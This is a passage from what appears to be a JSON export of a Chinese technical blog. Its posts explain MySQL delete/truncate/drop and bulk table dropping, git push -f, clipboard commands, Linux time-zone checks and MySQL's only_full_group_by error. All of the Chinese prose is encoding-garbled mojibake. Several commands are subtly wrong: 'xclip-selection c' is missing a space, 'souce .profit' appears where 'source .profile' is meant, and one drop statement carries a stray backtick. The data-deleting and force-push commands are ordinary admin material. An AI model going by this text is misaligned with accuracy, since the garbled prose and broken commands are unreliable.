åˆ é™¤è¡¨å†…æ‰€æœ‰æ•°æ®åˆ é™¤è¡¨ä¸­çš„å…¨éƒ¨æ•°æ®ï¼Œè¡¨ç»“æ„ä¸å˜ã€‚ å¯¹äº MyISAM ä¼šç«‹åˆ»é‡Šæ”¾ç£ç›˜ç©ºé—´ï¼ŒInnoDB ä¸ä¼šé‡Šæ”¾ç£ç›˜ç©ºé—´ã€‚ 1delete from User; é‡Šæ”¾ç£ç›˜ç©ºé—´ 1optimize table User; åˆ é™¤æ•°æ®è¡¨åˆ é™¤æ•°æ®è¡¨åˆ†ä¸ºä¸¤ç§æ–¹å¼ï¼š åˆ é™¤æ•°æ®è¡¨å†…æ•°æ®ä»¥åŠè¡¨ç»“æ„ åªåˆ é™¤è¡¨å†…æ•°æ®ï¼Œä¿ç•™è¡¨ç»“æ„ dropä½¿ç”¨dropå…³é”®è¯ä¼šåˆ é™¤æ•´å¼ è¡¨ï¼Œå•¥éƒ½æ²¡æœ‰äº†ã€‚ 1drop table User; truncatetruncate å…³é”®å­—åˆ™åªåˆ é™¤è¡¨å†…æ•°æ®ï¼Œä¼šä¿ç•™è¡¨ç»“æ„ã€‚ 1truncate table User; æ€è€ƒé¢˜ï¼šå¦‚ä½•æ‰¹é‡åˆ é™¤å‰ç¼€ç›¸åŒçš„è¡¨ï¼Ÿ æƒ³è¦å®ç° drop table like &#39;wp_%&#39;ï¼Œæ²¡æœ‰ç›´æ¥å¯ç”¨çš„å‘½ä»¤ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡Mysql çš„è¯­æ³•æ¥æ‹¼æ¥ã€‚ 1234-- åˆ é™¤â€wp_â€å¼€å¤´çš„è¡¨ï¼šSELECT CONCAT( &#39;drop table &#39;, table_name, &#39;;&#39; ) AS statementFROM information_schema.tablesWHERE table_schema &#x3D; &#39;database_name&#39; AND table_name LIKE &#39;wp_%&#39;; å…¶ä¸­database_nameæ¢æˆæ•°æ®åº“çš„åç§°ï¼Œwp_æ¢æˆéœ€è¦æ‰¹é‡åˆ é™¤çš„è¡¨å‰ç¼€ã€‚ æ³¨æ„åªæœ‰dropå‘½ä»¤æ‰èƒ½è¿™æ ·ç”¨ï¼š 1drop table if exists tablename&#96;; truncateåªèƒ½è¿™æ ·ä½¿ç”¨ï¼š 1truncate table &#96;tp_trade&#96;.&#96;setids&#96;; æ€»ç»“ å½“ä½ ä¸å†éœ€è¦è¯¥è¡¨æ—¶ï¼Œ ç”¨drop; å½“ä½ ä»è¦ä¿ç•™è¯¥è¡¨ï¼Œä½†è¦åˆ é™¤æ‰€æœ‰è®°å½•æ—¶ï¼Œ ç”¨truncate; å½“ä½ è¦åˆ é™¤éƒ¨åˆ†è®°å½•æ—¶ï¼Œ ç”¨deleteã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Git Push -f å‘½ä»¤è¯¦è§£","slug":"detailed-explanation-of-git-push-f-command","date":"2020-08-05T06:49:02.000Z","updated":"2020-12-10T03:37:24.822Z","comments":true,"path":"detailed-explanation-of-git-push-f-command/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/","excerpt":"æœ€è¿‘é‡åˆ°äº†ä¸€ä¸ªGit Push ç›¸å…³çš„é—®é¢˜ï¼ŒåŒäº‹ä¸å°å¿ƒæŠŠä¸€äº›é”™è¯¯ä»£ç æäº¤åˆ°ä»“åº“äº†ã€‚å¦‚æœæ¯ä¸ªäººç›´æ¥æ›´æ–°çš„è¯ï¼Œä¼šå¯¼è‡´é”™è¯¯ä»£ç ä¹Ÿæ›´æ–°åˆ°æœ¬åœ°äº†ã€‚ è¿™ä¸ªæ—¶å€™æƒ³è¦é¿å…è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼Œå”¯ä¸€å¯ä»¥åšçš„å°±æ˜¯å°†é‚£äº›é”™è¯¯ä»£ç ç›´æ¥è¦†ç›–æ‰ã€‚","text":"æœ€è¿‘é‡åˆ°äº†ä¸€ä¸ªGit Push ç›¸å…³çš„é—®é¢˜ï¼ŒåŒäº‹ä¸å°å¿ƒæŠŠä¸€äº›é”™è¯¯ä»£ç æäº¤åˆ°ä»“åº“äº†ã€‚å¦‚æœæ¯ä¸ªäººç›´æ¥æ›´æ–°çš„è¯ï¼Œä¼šå¯¼è‡´é”™è¯¯ä»£ç ä¹Ÿæ›´æ–°åˆ°æœ¬åœ°äº†ã€‚ è¿™ä¸ªæ—¶å€™æƒ³è¦é¿å…è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼Œå”¯ä¸€å¯ä»¥åšçš„å°±æ˜¯å°†é‚£äº›é”™è¯¯ä»£ç ç›´æ¥è¦†ç›–æ‰ã€‚ git push -fgit push -f è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯å°†è‡ªå·±æœ¬åœ°ä»“åº“çš„ä»£ç ç›´æ¥æ¨é€è‡³ä»“åº“ï¼Œå®Œå…¨ä»¥ä½ çš„æäº¤ä¸ºå‡†ï¼Œä¹‹å‰å…¶ä»–äººçš„æäº¤éƒ½ä¼šè¢«è¦†ç›–ã€‚ é‚£ä¹ˆè¿™ä¹ˆå¯æ€•çš„å‘½ä»¤ï¼Œç©¶ç«Ÿåœ¨ä»€ä¹ˆæƒ…å†µä¸‹æ‰é€‚ç”¨å‘¢ï¼Ÿ ä½¿ç”¨æ—¶æœºæœ‰ä¸¤ç§æƒ…å†µä¸‹é€‚åˆä½¿ç”¨è¿™ä¸ªå‘½ä»¤ï¼š ç¡®å®šéœ€è¦è¦†è¦†ç›–æäº¤ï¼Œå°±åƒä¸Šé¢çš„é‚£ç§æƒ…å†µï¼Œåœ¨æ˜ç¡®éƒ¨åˆ†æäº¤ä¼šå¯¼è‡´å¼‚å¸¸æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ–°çš„æäº¤å»è¦†ç›–ã€‚ éœ€è¦æ•´ç†å†å²æäº¤è®°å½•æ—¶ï¼Œæœ‰æ—¶å€™é¡¹ç›®çš„ Commit Logs å¯èƒ½æ¯”è¾ƒä¹±ï¼Œä¸èƒ½æ¸…æ™°çš„çœ‹å‡ºæ¯ä¸€æ¬¡æäº¤çš„ä½œç”¨ï¼Œå¯ä»¥ä½¿ç”¨ rebase å‘½ä»¤æ¥æ¸…ç†å†å²æäº¤è®°å½•ã€‚å› ä¸ºæ”¹å˜äº†å†å²ï¼Œæ‰€ä»¥æ­£å¸¸æ¥è¯´æ˜¯ pushä¸æˆåŠŸçš„ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ force pushæ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ é»˜è®¤åˆ†æ”¯ä¿æŠ¤å› ä¸ºå¯èƒ½ä¼šå‡ºç°ä¸å°å¿ƒä½¿ç”¨çš„æƒ…å†µï¼ŒGithubã€Gitlabè¿™ç±»æºç æ‰˜ç®¡ç½‘ç«™ä¼šæä¾›åˆ†æ”¯ä¿æŠ¤æœºåˆ¶ã€‚å¯ä»¥é¿å…æŸä¸ªåˆ†æ”¯è¢« force pushï¼Œé»˜è®¤æ˜¯ masterä¸ºä¿æŠ¤åˆ†æ”¯ã€‚ è¿™é‡Œä»¥Gitlabä¸ºä¾‹ï¼Œè®¾ç½®-&gt;ä»“åº“-&gt;Protected Branchesï¼š æ‰€ä»¥å¦‚æœæƒ³å¼ºåˆ¶æäº¤ï¼Œå‰æéœ€è¦å–æ¶ˆå¯¹è¯¥åˆ†æ”¯çš„ä¿æŠ¤ã€‚ ä¸‡ä¸€è‡ªå·±çš„ä»£ç è¢«è¦†ç›–æ‰äº†ï¼Œè¿˜æ•‘å¾—å›æ¥å—ï¼Ÿ å…¶å®ä¹Ÿæ˜¯æœ‰åŠæ³•çš„ï¼Œé‚£å°±æ˜¯æ¢ä½ æˆ–æ˜¯å…¶å®ƒæœ‰ä¹‹å‰æäº¤çš„åŒäº‹ï¼Œå†æ¬¡è¿›è¡Œ git push -fï¼Œå°†æ­£ç¡®çš„å†…å®¹å¼ºåˆ¶æäº¤ä¸Šå»ï¼Œè¦†ç›–ä¸Šä¸€æ¬¡git push -fæ‰€é€ æˆçš„ç¾éš¾ã€‚ å‚è€ƒé“¾æ¥è½èªª git push -f é€™å€‹æŒ‡ä»¤å¾ˆå¯æ€•ï¼Œä»€éº¼æƒ…æ³å¯ä»¥ä½¿ç”¨å®ƒå‘¢ï¼Ÿ","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Windows/Mac/Linux å¦‚ä½•å°†å†…å®¹è¾“å‡ºåˆ°å‰ªè´´æ¿","slug":"how-to-output-content-to-clipboard-on-windows-mac-linux","date":"2020-08-05T02:07:41.000Z","updated":"2020-09-27T01:22:11.596Z","comments":true,"path":"how-to-output-content-to-clipboard-on-windows-mac-linux/","link":"","permalink":"https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/","excerpt":"å¦‚ä½•å°†è¾“å‡ºç›´æ¥å¤åˆ¶è‡³å‰ªåˆ‡æ¿ï¼Ÿåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­ï¼Œæ‰€ä½¿ç”¨çš„å‘½ä»¤æ˜¯ä¸åŒçš„ã€‚","text":"å¦‚ä½•å°†è¾“å‡ºç›´æ¥å¤åˆ¶è‡³å‰ªåˆ‡æ¿ï¼Ÿåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­ï¼Œæ‰€ä½¿ç”¨çš„å‘½ä»¤æ˜¯ä¸åŒçš„ã€‚ Mac12345678&#x2F;&#x2F; å°†è¾“å‡ºå¤åˆ¶è‡³å‰ªè´´æ¿$ echo &quot;hello mac&quot; | pbcopy&#x2F;&#x2F; å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è‡³å‰ªè´´æ¿$ pbcopy &lt; remade.md&#x2F;&#x2F; å°†å‰ªåˆ‡æ¿ä¸­çš„å†…å®¹ç²˜è´´è‡³æ–‡ä»¶$ pbpaste &gt; remade.md LinuxLinux ç”¨æˆ·éœ€è¦å…ˆå®‰è£… xclipï¼Œå®ƒå»ºç«‹äº†ç»ˆç«¯å’Œå‰ªåˆ‡æ¿ä¹‹é—´çš„é€šé“ã€‚ 123456789101112&#x2F;&#x2F; æŸ¥çœ‹å‰ªåˆ‡æ¿ä¸­çš„å†…å®¹$ xclip -o$ xclip -selection c -o&#x2F;&#x2F; å°†è¾“å‡ºå¤åˆ¶è‡³å‰ªè´´æ¿$ echo &quot;hello xclip&quot; | xclip-selection c&#x2F;&#x2F; å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è‡³å‰ªè´´æ¿$ xclip -selection c remade.md&#x2F;&#x2F; å°†å‰ªåˆ‡æ¿ä¸­çš„å†…å®¹ç²˜è´´è‡³æ–‡ä»¶$ xclip -selection c -o &gt; remade.md æˆ–è€…ç›´æ¥ä½¿ç”¨xselå‘½ä»¤ï¼š 12345&#x2F;&#x2F; å°†è¾“å‡ºå¤åˆ¶è‡³å‰ªè´´æ¿$ echo &quot;hello linux&quot; | xsel&#x2F;&#x2F; å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è‡³å‰ªè´´æ¿$ xsel &lt; remade.md éœ€è¦æ³¨æ„çš„æ˜¯ï¼šxselã€xclip å‘½ä»¤æ˜¯åœ¨ X ç¯å¢ƒä¸‹ä½¿ç”¨çš„ï¼Œæ‰€ä»¥è¿œç¨‹è¿æ¥æœåŠ¡å™¨æ—¶ä½¿ç”¨ä¼šæŠ¥å¼‚å¸¸ï¼š 1xclip error can&#39;t open display (null) Windows12345&#x2F;&#x2F; å°†è¾“å‡ºå¤åˆ¶è‡³å‰ªè´´æ¿$ echo &quot;hello windows&quot; | clip&#x2F;&#x2F; å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è‡³å‰ªè´´æ¿$ clip &lt; remade.txt","categories":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"å¦‚ä½•æŸ¥çœ‹ Linux é»˜è®¤æ—¶åŒº","slug":"how-to-check-the-linux-default-time-zone","date":"2020-08-03T14:03:08.000Z","updated":"2020-08-25T02:19:08.477Z","comments":true,"path":"how-to-check-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/","excerpt":"æœ€è¿‘é‡åˆ°ä¸€ä¸ªè·ŸæœåŠ¡å™¨æ—¶åŒºç›¸å…³çš„é—®é¢˜ï¼Œæ²¡å‡†å¤‡å……åˆ†ï¼Œå½“é—®é¢˜çœŸæ­£æ¥ä¸´æ—¶ï¼Œå¾ˆæ‡µã€‚ ç‰¹åˆ«æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œç³»ç»Ÿæ—¶åŒºæ˜¯ç‰¹åˆ«é‡è¦çš„å­˜åœ¨ï¼Œå¾ˆå¤šåº”ç”¨åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯å–çš„ç³»ç»Ÿæ—¶åŒºï¼Œå¦‚æœæ—¶åŒºå¤„ç†ä¸å¾—å½“çš„è¯ï¼Œå¯èƒ½ä¼šé€ æˆä¸å¿…è¦çš„å›°æ‰°ã€‚","text":"æœ€è¿‘é‡åˆ°ä¸€ä¸ªè·ŸæœåŠ¡å™¨æ—¶åŒºç›¸å…³çš„é—®é¢˜ï¼Œæ²¡å‡†å¤‡å……åˆ†ï¼Œå½“é—®é¢˜çœŸæ­£æ¥ä¸´æ—¶ï¼Œå¾ˆæ‡µã€‚ ç‰¹åˆ«æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œç³»ç»Ÿæ—¶åŒºæ˜¯ç‰¹åˆ«é‡è¦çš„å­˜åœ¨ï¼Œå¾ˆå¤šåº”ç”¨åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯å–çš„ç³»ç»Ÿæ—¶åŒºï¼Œå¦‚æœæ—¶åŒºå¤„ç†ä¸å¾—å½“çš„è¯ï¼Œå¯èƒ½ä¼šé€ æˆä¸å¿…è¦çš„å›°æ‰°ã€‚ æ—¶åŒºçš„æ¦‚å¿µå…³äºæ—¶åŒºï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªæ ‡å‡†ï¼š CSTï¼šåŒ—ç¾ä¸­éƒ¨æ ‡å‡†æ—¶é—´ UTCï¼šåè°ƒä¸–ç•Œæ—¶ï¼Œåˆç§°ä¸–ç•Œæ ‡å‡†æ—¶é—´ï¼Œç®€ç§°UTCï¼Œä»è‹±æ–‡å›½é™…æ—¶é—´/æ³•æ–‡åè°ƒæ—¶é—´â€Universal Time/Temps CordonnÃ©â€è€Œæ¥ã€‚ä¸­å›½å¤§é™†ã€é¦™æ¸¯ã€æ¾³é—¨ã€å°æ¹¾ã€è’™å¤å›½ã€æ–°åŠ å¡ã€é©¬æ¥è¥¿äºšã€è²å¾‹å®¾ã€æ¾³æ´²è¥¿éƒ¨çš„æ—¶é—´ä¸UTCçš„æ—¶å·®å‡ä¸º+8ï¼Œä¹Ÿå°±æ˜¯UTC+8ã€‚ GMTï¼šæ ¼æ—å°¼æ²»æ ‡å‡†æ—¶é—´ï¼ˆæ—§è¯‘æ ¼æ—å¨æ²»å¹³å‡æ—¶é—´æˆ–æ ¼æ—å¨æ²»æ ‡å‡†æ—¶é—´ï¼›è‹±è¯­ï¼šGreenwich Mean Timeï¼ŒGMTï¼‰æ˜¯æŒ‡ä½äºè‹±å›½ä¼¦æ•¦éƒŠåŒºçš„çš‡å®¶æ ¼æ—å°¼æ²»å¤©æ–‡å°çš„æ ‡å‡†æ—¶é—´ï¼Œå› ä¸ºæœ¬åˆå­åˆçº¿è¢«å®šä¹‰åœ¨é€šè¿‡é‚£é‡Œçš„ç»çº¿ã€‚ Linux çš„æ—¶é—´åˆ†ä¸ºä¸¤ç§ï¼š ç¡¬ä»¶æ—¶é—´ï¼šç”± BIOSï¼ˆæˆ–CMOSï¼‰æ‰€è´Ÿè´£ã€‚ ç³»ç»Ÿæ—¶é—´ï¼šç”± Linux æ‰€è´Ÿè´£ï¼Œç³»ç»Ÿæ—¶é—´åœ¨ç³»ç»Ÿå¼€å…³æœºåè¯»å–ç¡¬ä»¶æ—¶é—´åï¼Œå†ç”± Linux ç®¡ç†æ—¶é—´ã€‚ datedateå‘½ä»¤æ˜¯æ˜¾ç¤ºæˆ–è®¾ç½®ç³»ç»Ÿæ—¶é—´ä¸æ—¥æœŸã€‚ è¿™ä¸ªæ˜¯æœ€ç®€å•ã€æœ€ç›´è§‚è·å–ç³»ç»Ÿæ—¶é—´ä¸æ—¥æœŸçš„æ–¹å¼äº†ã€‚ 12$ dateThu Jul 30 13:23:50 CST 2020 æ˜¾ç¤ºæ‰€åœ¨æ—¶åŒºï¼š 12date +&quot;%Z %z&quot;CST +0800 æ³¨æ„ + å’Œ &quot;ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ï¼Œå¦åˆ™ä¼šæŠ¥è¡¨ã€‚ date å‘½ä»¤å¸¸è§å‚æ•°ï¼š 12345678910111213141516171819202122232425%H å°æ—¶ï¼Œ24å°æ—¶åˆ¶ï¼ˆ00~23ï¼‰%I å°æ—¶ï¼Œ12å°æ—¶åˆ¶ï¼ˆ01~12ï¼‰%k å°æ—¶ï¼Œ24å°æ—¶åˆ¶ï¼ˆ0~23ï¼‰%l å°æ—¶ï¼Œ12å°æ—¶åˆ¶ï¼ˆ1~12ï¼‰%M åˆ†é’Ÿï¼ˆ00~59ï¼‰%p æ˜¾ç¤ºå‡ºAMæˆ–PM%r æ˜¾ç¤ºæ—¶é—´ï¼Œ12å°æ—¶åˆ¶ï¼ˆhh:mm:ss %pï¼‰%s ä»1970å¹´1æœˆ1æ—¥00:00:00åˆ°ç›®å‰ç»å†çš„ç§’æ•°%S æ˜¾ç¤ºç§’ï¼ˆ00~59ï¼‰%T æ˜¾ç¤ºæ—¶é—´ï¼Œ24å°æ—¶åˆ¶ï¼ˆhh:mm:ssï¼‰%X æ˜¾ç¤ºæ—¶é—´çš„æ ¼å¼ï¼ˆ%H:%M:%Sï¼‰%Z ä»¥å­—ç¬¦ä¸²çš„å½¢å¼æ˜¾ç¤ºæ—¶åŒºï¼Œæ—¥æœŸåŸŸï¼ˆCSTï¼‰%z ä»¥æ•°å­—çš„å½¢å¼æ˜¾ç¤ºæ—¶åŒº (+0800)%a æ˜ŸæœŸçš„ç®€ç§°ï¼ˆSun~Satï¼‰%A æ˜ŸæœŸçš„å…¨ç§°ï¼ˆSunday~Saturdayï¼‰%h,%b æœˆçš„ç®€ç§°ï¼ˆJan~Decï¼‰%B æœˆçš„å…¨ç§°ï¼ˆJanuary~Decemberï¼‰%c æ—¥æœŸå’Œæ—¶é—´ï¼ˆTue Nov 20 14:12:58 2012ï¼‰%d ä¸€ä¸ªæœˆçš„ç¬¬å‡ å¤©ï¼ˆ01~31ï¼‰%x,%D æ—¥æœŸï¼ˆmm&#x2F;dd&#x2F;yyï¼‰%j ä¸€å¹´çš„ç¬¬å‡ å¤©ï¼ˆ001~366ï¼‰%m æœˆä»½ï¼ˆ01~12ï¼‰%w ä¸€ä¸ªæ˜ŸæœŸçš„ç¬¬å‡ å¤©ï¼ˆ0ä»£è¡¨æ˜ŸæœŸå¤©ï¼‰%W ä¸€å¹´çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼ˆ00~53ï¼Œæ˜ŸæœŸä¸€ä¸ºç¬¬ä¸€å¤©ï¼‰%y å¹´çš„æœ€åä¸¤ä¸ªæ•°å­—ï¼ˆ1999åˆ™æ˜¯99ï¼‰ timedatectltimedatectl å‘½ä»¤éå¸¸çš„æ–¹ä¾¿ï¼Œå½“ä½ ä¸å¸¦ä»»ä½•å‚æ•°è¿è¡Œå®ƒæ—¶ï¼Œè¿™æ¡å‘½ä»¤å¯ä»¥åƒä¸‹å›¾ä¸€æ ·ï¼Œè¾“å‡ºç³»ç»Ÿæ—¶é—´æ¦‚è§ˆï¼Œå…¶ä¸­åŒ…å«å½“å‰æ—¶åŒºï¼š 123456789$ timedatectlLocal time: Thu 2020-07-30 05:30:21 UTC Universal time: Thu 2020-07-30 05:30:21 UTC RTC time: Thu 2020-07-30 05:30:21 Time zone: Etc&#x2F;UTC (UTC, +0000) System clock synchronized: yessystemd-timesyncd.service active: yes RTC in local TZ: no åªæŸ¥çœ‹æ—¶åŒºï¼š 1$ timedatectl | grep &quot;Time zone&quot; /etc/timezoneä½¿ç”¨ cat å‘½ä»¤æ˜¾ç¤ºæ–‡ä»¶ /etc/timezone çš„å†…å®¹ï¼Œæ¥æŸ¥çœ‹æ—¶åŒºï¼š 12$ cat &#x2F;etc&#x2F;timezoneEtc&#x2F;UTC é€‰æ‹©æ—¶åŒº 1$ tzselect é€‰æ‹©å®Œæˆä¹‹åï¼Œå°†æ—¶åŒºç›¸å…³çš„é…ç½®ï¼Œå†™å…¥.profité…ç½®æ–‡ä»¶ä¸­ã€‚ ç„¶åä½¿ç”¨ souce å‘½ä»¤ï¼Œå¼ºåˆ¶ç”Ÿæ•ˆã€‚ 1souce .profit å‚è€ƒé“¾æ¥ åœ¨ Linux ä¸­æŸ¥çœ‹æ—¶åŒº Linux date å‘½ä»¤ ä¸–ç•Œæ—¶é’Ÿåœ°å›¾","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql only_full_group_by å¼‚å¸¸è®°å½•","slug":"mysql-only-full-group-by-exception-record","date":"2020-07-31T12:17:14.000Z","updated":"2020-08-03T00:05:40.992Z","comments":true,"path":"mysql-only-full-group-by-exception-record/","link":"","permalink":"https://www.0x2beace.com/mysql-only-full-group-by-exception-record/","excerpt":"æœ€è¿‘å¾ˆé¢‘ç¹çš„é‡åˆ°ä¸€ä¸ªMysql å¼‚å¸¸ï¼Œé”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼š 123Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by","text":"æœ€è¿‘å¾ˆé¢‘ç¹çš„é‡åˆ°ä¸€ä¸ªMysql å¼‚å¸¸ï¼Œé”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼š 123Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by é€šè¿‡é”™è¯¯ä¿¡æ¯å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯å› ä¸º sql_mode å¼•èµ·çš„ã€‚ æŸ¥çœ‹Mysql å½“å‰æ‰€ä½¿ç”¨çš„ sql_modeï¼š 1234567select @@sql_mode+-------------------------+| @@sql_mode |+-------------------------+| ONLY_FULL_GROUP_BY |+-------------------------+ sql_mode é…ç½®è§£æONLY_FULL_GROUP_BYå¯¹äºGROUP BYèšåˆæ“ä½œï¼Œå¦‚æœåœ¨SELECTä¸­çš„åˆ—ï¼Œæ²¡æœ‰åœ¨GROUP BYä¸­å‡ºç°ï¼Œé‚£ä¹ˆè¿™ä¸ªSQLæ˜¯ä¸åˆæ³•çš„ï¼Œå› ä¸ºåˆ—ä¸åœ¨GROUP BYä»å¥ä¸­ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯SELECTåé¢æ¥çš„åˆ—å¿…é¡»è¢«GROUP BYåé¢æ¥çš„åˆ—æ‰€åŒ…å«ã€‚å¦‚ï¼š select a,b from table group by a,b,c; (æ­£ç¡®) select a,b,c from table group by a,b; (é”™è¯¯) è¿™ä¸ªé…ç½®ä¼šä½¿å¾—GROUP BYè¯­å¥ç¯å¢ƒå˜å¾—ååˆ†ç‹­çª„ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½ä¸åŠ è¿™ä¸ªé…ç½® NO_AUTO_VALUE_ON_ZEROè¯¥å€¼å½±å“è‡ªå¢é•¿åˆ—çš„æ’å…¥ã€‚é»˜è®¤è®¾ç½®ä¸‹ï¼Œæ’å…¥0æˆ–NULLä»£è¡¨ç”Ÿæˆä¸‹ä¸€ä¸ªè‡ªå¢é•¿å€¼ã€‚ï¼ˆä¸ä¿¡çš„å¯ä»¥è¯•è¯•ï¼Œé»˜è®¤çš„sql_modeä½ åœ¨è‡ªå¢ä¸»é”®åˆ—è®¾ç½®ä¸º0ï¼Œè¯¥å­—æ®µä¼šè‡ªåŠ¨å˜ä¸ºæœ€æ–°çš„è‡ªå¢å€¼ï¼Œæ•ˆæœå’Œnullä¸€æ ·ï¼‰ï¼Œå¦‚æœç”¨æˆ·å¸Œæœ›æ’å…¥çš„å€¼ä¸º0ï¼ˆä¸æ”¹å˜ï¼‰ï¼Œè¯¥åˆ—åˆæ˜¯è‡ªå¢é•¿çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªé€‰é¡¹å°±æœ‰ç”¨äº†ã€‚ STRICT_TRANS_TABLESåœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œå¦‚æœä¸€ä¸ªå€¼ä¸èƒ½æ’å…¥åˆ°ä¸€ä¸ªäº‹åŠ¡è¡¨ä¸­ï¼Œåˆ™ä¸­æ–­å½“å‰çš„æ“ä½œï¼Œå¯¹éäº‹åŠ¡è¡¨ä¸åšé™åˆ¶ã€‚ï¼ˆInnoDBé»˜è®¤äº‹åŠ¡è¡¨ï¼ŒMyISAMé»˜è®¤éäº‹åŠ¡è¡¨ï¼›MySQLäº‹åŠ¡è¡¨æ”¯æŒå°†æ‰¹å¤„ç†å½“åšä¸€ä¸ªå®Œæ•´çš„ä»»åŠ¡ç»Ÿä¸€æäº¤æˆ–å›æ»šï¼Œå³å¯¹åŒ…å«åœ¨äº‹åŠ¡ä¸­çš„å¤šæ¡è¯­å¥è¦ä¹ˆå…¨æ‰§è¡Œï¼Œè¦ä¹ˆå…¨éƒ¨ä¸æ‰§è¡Œã€‚éäº‹åŠ¡è¡¨åˆ™ä¸æ”¯æŒæ­¤ç§æ“ä½œï¼Œæ‰¹å¤„ç†ä¸­çš„è¯­å¥å¦‚æœé‡åˆ°é”™è¯¯ï¼Œåœ¨é”™è¯¯å‰çš„è¯­å¥æ‰§è¡ŒæˆåŠŸï¼Œä¹‹åçš„åˆ™ä¸æ‰§è¡Œï¼›MySQLäº‹åŠ¡è¡¨æœ‰è¡¨é”ä¸è¡Œé”éäº‹åŠ¡è¡¨åˆ™åªæœ‰è¡¨é”ï¼‰ NO_ZERO_IN_DATEåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œä¸å…è®¸æ—¥æœŸå’Œæœˆä»½ä¸ºé›¶ NO_ZERO_DATEè®¾ç½®è¯¥å€¼ï¼Œmysqlæ•°æ®åº“ä¸å…è®¸æ’å…¥é›¶æ—¥æœŸï¼Œæ’å…¥é›¶æ—¥æœŸä¼šæŠ›å‡ºé”™è¯¯è€Œä¸æ˜¯è­¦å‘Šã€‚ ERROR_FOR_DIVISION_BY_ZEROåœ¨INSERTæˆ–UPDATEè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ•°æ®è¢«é›¶é™¤ï¼Œåˆ™äº§ç”Ÿé”™è¯¯è€Œéè­¦å‘Šã€‚å¦‚ æœæœªç»™å‡ºè¯¥æ¨¡å¼ï¼Œé‚£ä¹ˆæ•°æ®è¢«é›¶é™¤æ—¶MySQLè¿”å›NULL NO_AUTO_CREATE_USERç¦æ­¢GRANTåˆ›å»ºå¯†ç ä¸ºç©ºçš„ç”¨æˆ· NO_ENGINE_SUBSTITUTIONå¦‚æœéœ€è¦çš„å­˜å‚¨å¼•æ“è¢«ç¦ç”¨æˆ–æœªç¼–è¯‘ï¼Œé‚£ä¹ˆæŠ›å‡ºé”™è¯¯ã€‚ä¸è®¾ç½®æ­¤å€¼æ—¶ï¼Œç”¨é»˜è®¤çš„å­˜å‚¨å¼•æ“æ›¿ä»£ï¼Œå¹¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ PIPES_AS_CONCATå°†â€||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼ ANSI_QUOTESå¯ç”¨ANSI_QUOTESåï¼Œä¸èƒ½ç”¨åŒå¼•å·æ¥å¼•ç”¨å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«è§£é‡Šä¸ºè¯†åˆ«ç¬¦ è§£å†³æ–¹æ¡ˆç¼–è¾‘my.cnfé…ç½®æ–‡ä»¶ï¼Œå°† ONLY_FULL_GROUP_BY å»æ‰ã€‚ 